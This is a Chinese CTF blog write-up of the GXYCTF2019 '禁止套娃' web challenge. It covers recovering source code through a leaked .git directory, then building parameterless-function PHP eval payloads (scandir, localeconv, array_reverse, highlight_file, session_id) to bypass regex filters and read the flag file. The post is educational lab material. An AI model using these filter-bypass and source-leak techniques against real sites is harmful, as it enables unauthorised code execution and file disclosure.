@@ -1,0 +1,250 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GXYCTF2019 禁止套娃 | Αιώνιος</title><meta name="keywords" content="buu"><meta name="author" content="4v1d"><meta name="copyright" content="4v1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="​    靶机启动：  查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来 查看了wp才知道这是git泄露。 知识补充：简述.git文件导致的源码泄露.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。 原理利用1、通常开发人员在开发时，通常将源码提交到远程的托">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF2019 禁止套娃">
+<meta property="og:url" content="http://daweitech.github.io/2021/08/01/2021/buu/5/index.html">
+<meta property="og:site_name" content="Αιώνιος">
+<meta property="og:description" content="​    靶机启动：  查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来 查看了wp才知道这是git泄露。 知识补充：简述.git文件导致的源码泄露.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。 原理利用1、通常开发人员在开发时，通常将源码提交到远程的托">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/dulily/cdn/raw/master/img/182205-15517813255631.jpg">
+<meta property="article:published_time" content="2021-08-01T07:18:57.000Z">
+<meta property="article:modified_time" content="2021-10-15T06:31:10.221Z">
+<meta property="article:author" content="4v1d">
+<meta property="article:tag" content="buu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/dulily/cdn/raw/master/img/182205-15517813255631.jpg"><link rel="shortcut icon" href="/imgr/15.jpg"><link rel="canonical" href="http://daweitech.github.io/2021/08/01/2021/buu/5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="www.baidu.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-15 14:31:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script> <link rel="preconnect" href="https://fonts.gstatic.com"> <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,300&display=swap" rel="stylesheet"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">87</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://gitee.com/dulily/cdn/raw/master/img/182205-15517813255631.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Αιώνιος</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GXYCTF2019 禁止套娃</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-01T07:18:57.000Z" title="Created 2021-08-01 15:18:57">2021-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-15T06:31:10.221Z" title="Updated 2021-10-15 14:31:10">2021-10-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>​    靶机启动：</p>
+<p><img src="/2021/08/01/2021/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p>
+<p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
+<p>查看了wp才知道这是git泄露。</p>
+<h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p>
+<h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p>
+<p>这时候我们用了名为GitHack的工具</p>
+<p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
+<p>进行了扫描，获取源文件：</p>
+<p><img src="/2021/08/01/2021/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p>
+<p><img src="/2021/08/01/2021/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p>
+<p>源码分析：</p>
+<ul>
+<li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li>
+<li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li>
+<li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
+<li>第三层<code>preg_match()</code>限制了一些关键字</li>
+<li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
+<li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
+</ul>
+<p><img src="/2021/08/01/2021/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
+<p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那么问题就是如何构造<br>scandir(‘.’)</p>
+<p>这里再看函数：</p>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p>
+<p><strong>current(localeconv())永远都是个点</strong></p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/01/2021/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
+<p>到这里我们也只是可以知道flag.php的存在</p>
+<p>却还不能读取它的源码</p>
+<p><img src="/2021/08/01/2021/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p>
+<p>从上图的官方解释中可以知道</p>
+<p>我们无法用单独的函数读取源码</p>
+<p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.array_flip()</strong></p>
+<p>交换数组的键和值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.array_rand()</strong></p>
+<p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));    </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/01/2021/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
+<p>参考博客：</p>
+<p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
+<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p>
+<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p>
+<h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>学长用这题做模板，做了改造题</p>
+<p>本来以为很简单(好吧其实是很简单)</p>
+<p>先用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/08/01/2021/buu/5/image-20210827201807385.png" alt="image-20210827201807385"></p>
+<p>再直接读取（我就是傻傻一直不读读取的孩子啊，在那array_reverse，哭死了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(this_is_real_flag);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/01/2021/buu/5/image-20210827201914618.png" alt="image-20210827201914618"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">4v1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://daweitech.github.io/2021/08/01/2021/buu/5/">http://daweitech.github.io/2021/08/01/2021/buu/5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/buu/">buu</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=null" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/02/2021/buu/6/"><img class="prev-cover" src="https://gitee.com/dulily/cdn/raw/master/img/001698fa0fe48a4dbc96b36db6c2f53d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">网鼎杯 2018 Fakebook</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/30/2021/buu/4/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CISCN 2019 初赛	Love Math</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/05/12/2021/buu/0/" title="mutiple"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-12</div><div class="title">mutiple</div></div></a></div><div><a href="/2021/08/08/2021/buu/10/" title="安洵杯 2019 easy_web"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-08</div><div class="title">安洵杯 2019 easy_web</div></div></a></div><div><a href="/2021/08/17/2021/buu/12/" title="0CTF 2016 piapiapia"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/me.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-17</div><div class="title">0CTF 2016 piapiapia</div></div></a></div><div><a href="/2021/08/11/2021/buu/11/" title="网鼎杯 2020 朱雀组 phpweb&NCTF2019 Fake XML cookbook"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/20201204105719.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">网鼎杯 2020 朱雀组 phpweb&NCTF2019 Fake XML cookbook</div></div></a></div><div><a href="/2021/08/18/2021/buu/13/" title="De1CTF 2019 SSRF Me"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/182205-15517813255631.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-18</div><div class="title">De1CTF 2019 SSRF Me</div></div></a></div><div><a href="/2021/08/19/2021/buu/14/" title="安洵杯 2019 easy_serialize_php"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/001698fa0fe48a4dbc96b36db6c2f53d.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-19</div><div class="title">安洵杯 2019 easy_serialize_php</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/87.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">4v1d</div><div class="author-info__description">Don't cry because it is over, smile because it happened.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">87</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/daweitech"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/daweitech" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:daweitech@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atmo.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">What can not give up , what also can not change.</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">知识补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-git%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">简述.git文件导致的源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">原理利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">后记：</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/20/2022/1/notes/" title="notes"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="notes"/></a><div class="content"><a class="title" href="/2022/01/20/2022/1/notes/" title="notes">notes</a><time datetime="2022-01-20T12:37:47.000Z" title="Created 2022-01-20 20:37:47">2022-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/" title="湖湘杯"><img src="/imgr/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="湖湘杯"/></a><div class="content"><a class="title" href="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/" title="湖湘杯">湖湘杯</a><time datetime="2021-11-17T11:15:31.000Z" title="Created 2021-11-17 19:15:31">2021-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/2021/buu/26/" title="bluecms"><img src="/imgr/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bluecms"/></a><div class="content"><a class="title" href="/2021/11/01/2021/buu/26/" title="bluecms">bluecms</a><time datetime="2021-11-01T12:55:54.000Z" title="Created 2021-11-01 20:55:54">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="字符串逃逸"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="字符串逃逸"/></a><div class="content"><a class="title" href="/2021/10/28/2021/web/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="字符串逃逸">字符串逃逸</a><time datetime="2021-10-28T12:14:29.000Z" title="Created 2021-10-28 20:14:29">2021-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/26/2021/nss/1/" title="天翼杯 2021 esay_eval"><img src="/imgr/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="天翼杯 2021 esay_eval"/></a><div class="content"><a class="title" href="/2021/10/26/2021/nss/1/" title="天翼杯 2021 esay_eval">天翼杯 2021 esay_eval</a><time datetime="2021-10-26T11:41:39.000Z" title="Created 2021-10-26 19:41:39">2021-10-26</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/8.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 4v1d</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a 